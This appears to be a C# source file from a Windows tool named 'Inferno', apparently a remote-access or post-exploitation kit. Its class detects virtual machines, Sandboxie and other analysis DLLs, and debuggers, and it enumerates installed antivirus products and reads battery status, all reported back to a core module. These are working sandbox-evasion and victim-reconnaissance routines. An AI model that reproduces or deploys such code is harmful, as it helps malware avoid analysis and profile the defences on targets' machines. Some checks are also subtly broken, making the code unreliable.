﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Management;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace Inferno
{
	internal class status
	{

		// Output
		private static dynamic output = new System.Dynamic.ExpandoObject();

		[DllImport("kernel32.dll")]
		protected static extern IntPtr GetModuleHandle(string lpModuleName);

		// VirtualBox
		private static bool VirtualBox()
		{
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
			{
				try
				{
					using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
					{
						foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
						{
							if ((managementBaseObject["Manufacturer"].ToString().ToLower() == "microsoft corporation" && managementBaseObject["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) || managementBaseObject["Manufacturer"].ToString().ToLower().Contains("vmware") || managementBaseObject["Model"].ToString() == "VirtualBox")
							{
								return true;
							}
						}
					}
				}
				catch
				{
					return true;
				}
			}
			foreach (ManagementBaseObject managementBaseObject2 in new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController").Get())
			{
				if (managementBaseObject2.GetPropertyValue("Name").ToString().Contains("VMware") && managementBaseObject2.GetPropertyValue("Name").ToString().Contains("VBox"))
				{
					return true;
				}
			}
			return false;
		}
		// In VirtualBox
		public static void inVirtualBox()
		{
			output.VirtualBox = VirtualBox();
			core.Exit("VirtualBox check", output);
		}

		// SandBoxie
		private static bool Sandboxie()
		{
			string[] array = new string[5]
			{
				"SbieDll.dll",
				"SxIn.dll",
				"Sf2.dll",
				"snxhk.dll",
				"cmdvrt32.dll"
			};
			for (int i = 0; i < array.Length; i++)
			{
				if (GetModuleHandle(array[i]).ToInt32() != 0)
				{
					return true;
				}
			}
			return false;
		}
		// In SandBoxie
		public static void inSandboxie()
		{
			output.SandBox = Sandboxie();
			core.Exit("SandBoxie check", output);
		}

		// Debugger
		private static bool Debugger()
		{
			try
			{
				long ticks = DateTime.Now.Ticks;
				Thread.Sleep(10);
				if (DateTime.Now.Ticks - ticks < 10L)
				{
					return true;
				}
			}
			catch { }
			return false;
		}

		// In Debugger
		public static void inDebugger()
		{
			output.Debugger = Debugger();
			core.Exit("Debugger check", output);
		}

		// Battery
		public static void betteryLevel()
		{
			var result = new System.Collections.Generic.Dictionary<string, string>();
			string batteryStatus = SystemInformation.PowerStatus.BatteryChargeStatus.ToString();
			string[] batteryLife = SystemInformation.PowerStatus.BatteryLifePercent.ToString().Split(',');

			result.Add("percentage", batteryLife[batteryLife.Length - 1]);
			result.Add("status", batteryStatus);

			output.battery = result;
			core.Exit("Battery information received!", output);
		}

		// Get installed antivirus
		public static void antivirus()
		{
			List<string> detected = new List<string>();
			string[] av_path = new string[]
			{
				"AVAST Software\\Avast",
				"AVG\\Antivirus",
				"Avira\\Launcher",
				"IObit\\Advanced SystemCare",
				"Bitdefender Antivirus Free",
				"COMODO\\COMODO Internet Security",
				"DrWeb",
				"ESET\\ESET Security",
				"GRIZZLY Antivirus",
				"Kaspersky Lab",
				"IObit\\IObit Malware Fighter",
				"Norton Security",
				"Panda Security\\Panda Security Protection",
				"360\\Total Security",
				"Windows Defender"
			};

			foreach(string av in av_path)
			{
				string av_dir = Environment.GetEnvironmentVariable("ProgramFiles") + "\\" + av;
				if (Directory.Exists(av_dir))
				{
					detected.Add(Path.GetFileName(Path.GetDirectoryName(av_dir + "\\0")));
				}
			}
			output.detected = detected;
			core.Exit("Detected " + detected.Count + " antiviruses", output);
		}

	}
}
